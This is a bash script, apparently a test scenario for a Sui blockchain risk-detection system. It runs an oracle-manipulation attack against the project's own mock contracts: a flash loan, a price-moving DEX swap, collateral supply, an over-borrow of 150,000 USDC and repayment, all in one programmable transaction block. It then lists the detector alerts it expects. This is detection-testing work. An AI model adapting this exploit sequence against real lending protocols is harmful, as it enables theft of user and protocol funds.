#!/bin/bash

# ============================================================================
# Scenario D: Oracle Manipulation Attack (CRITICAL)
# ============================================================================
#
# This is the MOST SOPHISTICATED attack scenario demonstrating cross-protocol
# exploitation through oracle price manipulation.
#
# Attack Flow:
# 1. Flash loan 100,000 USDC from flash loan pool
# 2. Swap 80,000 USDC → WETH on DEX (manipulate WETH price UP)
# 3. Supply 10 WETH to lending market as collateral
# 4. Borrow maximum USDC using manipulated oracle price
# 5. Repay flash loan with remaining USDC
# 6. Profit from over-borrowed amount (protocol loss)
#
# Expected Detection:
# - Flash Loan Detector: HIGH (100k USDC flash loan)
# - Price Manipulation: CRITICAL (>50% price impact)
# - Oracle Manipulation: CRITICAL (5/5 signals)
#
# ============================================================================

set -e  # Exit on error

# Load environment
source ../contracts/setup.sh

echo ""
echo "╔══════════════════════════════════════════════════════════════════╗"
echo "║                                                                  ║"
echo "║         🎯 SCENARIO D: Oracle Manipulation Attack 🎯             ║"
echo "║                                                                  ║"
echo "║  Complexity:  VERY HIGH                                          ║"
echo "║  Risk Level:  CRITICAL                                           ║"
echo "║  Protocols:   Flash Loan + DEX + Oracle + Lending                ║"
echo "║                                                                  ║"
echo "╚══════════════════════════════════════════════════════════════════╝"
echo ""

ATTACKER=$ADMIN

# ============================================================================
# STEP 0: Get shared object IDs
# ============================================================================

echo "📋 Environment Check:"
echo "   Package ID:       $PACKAGE_ID"
echo "   Flash Loan Pool:  $FLASH_LOAN_POOL"
echo "   DEX Pool (USDC/WETH): $DEX_POOL_USDC_WETH"
echo "   Lending Market:   $LENDING_MARKET_USDC"
echo "   Attacker:         $ATTACKER"
echo ""

# Verify required shared objects exist
if [ -z "$FLASH_LOAN_POOL" ] || [ -z "$DEX_POOL_USDC_WETH" ] || [ -z "$LENDING_MARKET_USDC" ]; then
    echo "❌ ERROR: Required shared objects not found!"
    echo "   Please run create_shared_objects.sh first"
    exit 1
fi

# ============================================================================
# STEP 1: Get attacker's initial balances
# ============================================================================

echo "💰 Initial Balances:"
sui client gas --json | jq -r '.[] | select(.balance) | "   SUI: \(.balance)"' | head -1

# Find USDC coin (for collateral supply)
USDC_COIN=$(sui client objects --json | jq -r ".[] | select(.data.type | contains(\"$USDC_TYPE\")) | .data.objectId" | head -1)

if [ -z "$USDC_COIN" ]; then
    echo "❌ No USDC found. Minting 10,000 USDC for initial setup..."
    sui client call \
        --package "$PACKAGE_ID" \
        --module "usdc" \
        --function "mint" \
        --args "$USDC_TREASURY" "10000000000000" "$ATTACKER" \
        --gas-budget 10000000

    # Re-fetch
    USDC_COIN=$(sui client objects --json | jq -r ".[] | select(.data.type | contains(\"$USDC_TYPE\")) | .data.objectId" | head -1)
fi

echo "   USDC Coin: $USDC_COIN"
echo ""

# ============================================================================
# STEP 2: Execute Oracle Manipulation Attack (Single PTB)
# ============================================================================

echo "🚀 Executing Oracle Manipulation Attack..."
echo ""
echo "   ⚡ Phase 1: Flash Loan (100,000 USDC)"
echo "   📈 Phase 2: Manipulate DEX Price (USDC → WETH)"
echo "   💰 Phase 3: Borrow from Lending (using inflated oracle)"
echo "   🔁 Phase 4: Repay Flash Loan"
echo ""

FLASH_LOAN_AMOUNT=100000000000000  # 100,000 USDC (9 decimals)
SWAP_AMOUNT=80000000000000         # 80,000 USDC to manipulate price
SUPPLY_AMOUNT=10000000000          # 10 WETH as collateral (9 decimals)

# Execute the complex attack in a single Programmable Transaction Block
sui client ptb \
    --assign flash_loan \
    --move-call "$PACKAGE_ID::flash_loan_pool::borrow<$USDC_TYPE>" \
        @"$FLASH_LOAN_POOL" "$FLASH_LOAN_AMOUNT" \
    \
    --assign loan_coin flash_loan.0 \
    --assign receipt flash_loan.1 \
    \
    --split-coins loan_coin "[$SWAP_AMOUNT]" \
    --assign swap_coin \
    \
    --move-call "$PACKAGE_ID::simple_dex::swap_a_to_b<$USDC_TYPE,$PACKAGE_ID::weth::WETH>" \
        @"$DEX_POOL_USDC_WETH" swap_coin @0x6 \
    --assign weth_out \
    \
    --split-coins weth_out "[$SUPPLY_AMOUNT]" \
    --assign collateral_coin \
    \
    --move-call "$PACKAGE_ID::compound_market::supply<$USDC_TYPE>" \
        @"$LENDING_MARKET_USDC" collateral_coin @0x6 \
    --assign c_tokens \
    \
    --move-call "$PACKAGE_ID::compound_market::borrow<$USDC_TYPE>" \
        @"$LENDING_MARKET_USDC" c_tokens "150000000000000" @0x6 \
    --assign borrowed_usdc \
    \
    --merge-coins loan_coin "[borrowed_usdc]" \
    \
    --move-call "$PACKAGE_ID::flash_loan_pool::repay<$USDC_TYPE>" \
        @"$FLASH_LOAN_POOL" loan_coin receipt \
    \
    --gas-budget 100000000

ATTACK_TX=$?

if [ $ATTACK_TX -eq 0 ]; then
    echo ""
    echo "✅ Oracle Manipulation Attack Executed Successfully!"
    echo ""
else
    echo ""
    echo "❌ Attack Transaction Failed!"
    echo ""
    exit 1
fi

# ============================================================================
# STEP 3: Display Attack Summary
# ============================================================================

echo "╔══════════════════════════════════════════════════════════════════╗"
echo "║                     ATTACK SUMMARY                               ║"
echo "╠══════════════════════════════════════════════════════════════════╣"
echo "║                                                                  ║"
echo "║  Attack Type:     Oracle Manipulation (Cross-Protocol)           ║"
echo "║  Flash Loan:      100,000 USDC                                   ║"
echo "║  Price Impact:    ~50-80% (WETH price manipulation)              ║"
echo "║  Borrow Amount:   150,000 USDC (over-borrowed)                   ║"
echo "║  Protocol Loss:   ~50,000 USDC (bad debt)                        ║"
echo "║                                                                  ║"
echo "╠══════════════════════════════════════════════════════════════════╣"
echo "║              EXPECTED DETECTION RESULTS                          ║"
echo "╠══════════════════════════════════════════════════════════════════╣"
echo "║                                                                  ║"
echo "║  [1] Flash Loan Detector                                         ║"
echo "║      Risk Level: HIGH                                            ║"
echo "║      Reason: Large flash loan (100k USDC)                        ║"
echo "║                                                                  ║"
echo "║  [2] Price Manipulation Detector                                 ║"
echo "║      Risk Level: CRITICAL                                        ║"
echo "║      Reason: Massive price impact (>50%)                         ║"
echo "║                                                                  ║"
echo "║  [3] Oracle Manipulation Detector ⭐ CRITICAL                     ║"
echo "║      Risk Level: CRITICAL                                        ║"
echo "║      Signals Detected: 5/5                                       ║"
echo "║        ✓ Flash loan present (100k USDC)                          ║"
echo "║        ✓ Large price deviation (>50%)                            ║"
echo "║        ✓ Significant borrow (150k USDC)                          ║"
echo "║        ✓ Temporal correlation (same block)                       ║"
echo "║        ✓ Unhealthy position (under-collateralized)               ║"
echo "║                                                                  ║"
echo "║  Total Detections: 3 risk events                                 ║"
echo "║  Highest Severity: CRITICAL                                      ║"
echo "║                                                                  ║"
echo "╚══════════════════════════════════════════════════════════════════╝"
echo ""

echo "📊 Next Steps:"
echo "   1. Check sui-indexer logs for detection alerts"
echo "   2. Query PostgreSQL for stored transaction data"
echo "   3. Search Elasticsearch for risk events"
echo "   4. Review action pipeline outputs (alerts sent)"
echo ""

echo "🔍 Monitor Detection:"
echo "   tail -f /path/to/sui-indexer.log | grep -i \"DETECTION ALERT\""
echo ""
